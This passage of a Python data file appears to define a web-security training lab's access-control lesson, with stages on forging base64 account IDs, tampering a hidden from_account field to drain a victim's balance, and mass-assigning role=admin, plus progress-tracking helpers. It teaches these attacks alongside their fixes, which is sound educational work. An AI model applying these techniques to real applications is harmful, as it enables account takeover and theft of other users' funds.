                    "The challenge wants profile #3 specifically.",
                ],
            },
            {
                "n": 2,
                "title": "Encoded ID tampering",
                "objective": "Account IDs in the URL are base64(int). Open the victim's account (101 → 102) and submit one of their transaction IDs.",
                "learning_outcome": "After this stage you can decode and forge encoded resource IDs.",
                "concept": "Encoding (base64, hex, even encryption with a leaked key) is not authorization. If the user can compute or guess valid IDs, the obfuscation only slows them down.",
                "how_to": [
                    "Decode your own acct param. atob('MTAx') = '101'.",
                    "The victim's account is the next integer up — 102 — encoded as 'MTAy'.",
                    "Open  /lesson/access-control/tx?acct=MTAy   to see their transactions.",
                    "Submit any transaction id from that list.",
                ],
                "worked_example": {
                    "description": "Decoding your own acct: atob('MTAx') prints '101'. That tells you the format is base64 of a small integer — easy to enumerate.",
                    "payload":     "101",
                    "explanation": "Predictable encoded IDs are still predictable. Encoding hides the format from a casual glance; it does nothing to stop someone with a console.",
                },
                "hints": [
                    "Decode your own account id (base64) — you'll see it's the integer 101.",
                    "The victim's account is one or two integers higher. base64-encode 102 and 103 and try them.",
                ],
            },
            {
                "n": 3,
                "title": "Hidden-field tampering / transfer",
                "objective": "The transfer form has a hidden from_account field. Tamper it so the victim's balance reaches 0.",
                "learning_outcome": "After this stage you can tamper with hidden form fields to take actions on other users.",
                "concept": "Hidden inputs are part of the form the user submits. The server cannot tell whether the user typed the value, the page set it via JavaScript, or the user replaced it with devtools. Trusting a hidden field for authorization is identical to trusting any other user input.",
                "how_to": [
                    "Inspect the form. Find <input type=\"hidden\" name=\"from_account\" value=\"<your-acct>\">.",
                    "Replace the value with the victim's encoded account id (MTAy).",
                    "Set amount to the victim's full balance (999.99).",
                    "Submit. The server uses whatever from_account you sent.",
                ],
                "worked_example": {
                    "description": "Worked example: a $1 transfer FROM your own account (MTAx) to anyone. That demonstrates the form is functional. Now switch from_account to MTAy and drain.",
                    "payload":     "1.00",
                    "explanation": "Real fix: derive the source account from the server-side session, not the form. The form should only contain transaction details (target, amount), never identity.",
                },
                "hints": [
                    "Inspect the form. Replace the hidden from_account value with the victim's encoded id.",
                    "Submit a transfer for the full balance. The server trusts whatever from_account you send.",
                ],
            },
            {
                "n": 4,
                "title": "Mass-assignment privilege escalation",
                "objective": "The /update-profile endpoint accepts any field you POST — including role. Promote yourself to admin and submit the flag from the admin panel.",
                "learning_outcome": "After this stage you can exploit mass-assignment to set fields the form never showed.",
                "concept": "Mass-assignment (or 'over-posting') is when the server takes the entire submitted form and applies it directly to a record without an allowlist of which fields the user is allowed to change. Sensitive fields like role or is_admin become writable to anyone.",
                "how_to": [
                    "Open the update-profile form.",
                    "Add a field the form didn't show — name=role, value=admin. (You can edit the form via Inspect, or just include the field on submit.)",
                    "After saving, the admin panel reveals the flag.",
                    "Submit the flag in the flag-submit field below.",
                ],
                "worked_example": {
                    "description": "Try setting an undocumented but harmless field first:  theme=dark   The endpoint happily accepts and stores it on your profile, proving it has no allowlist.",
                    "payload":     "dark",
                    "explanation": "The handler does profile.update(form_dict). dict.update has no concept of which keys the user 'owns'. Real fix: explicitly allowlist  {name, email}  and ignore everything else.",
                },
                "hints": [
                    "Add a role=admin field to the profile-update form.",
                    "Once you're admin, the admin panel reveals the flag. Submit the flag.",
                ],
            },
        ],
    },
]


def stage_id(lesson_id: str, n: int) -> str:
    return f"{lesson_id}-s{n}"


def lesson_progress(lesson, is_complete_fn):
    stages = lesson.get("stages", [])
    done = sum(1 for s in stages if is_complete_fn(stage_id(lesson["id"], s["n"])))
    return done, len(stages)


def lessons_with_status(is_complete_fn):
    out = []
    for L in LESSONS:
        done, total = lesson_progress(L, is_complete_fn)
        out.append({
            **L,
            "stages_done": done,
            "stages_total": total,
            "completed": total > 0 and done == total,
        })
    return out


def get_lesson(lesson_id: str):
    for L in LESSONS:
        if L["id"] == lesson_id:
            return L
    return None


def get_stage(lesson_id: str, n: int):
    L = get_lesson(lesson_id)
    if not L:
        return None
    for s in L.get("stages", []):
        if s["n"] == n:
            return s
    return None
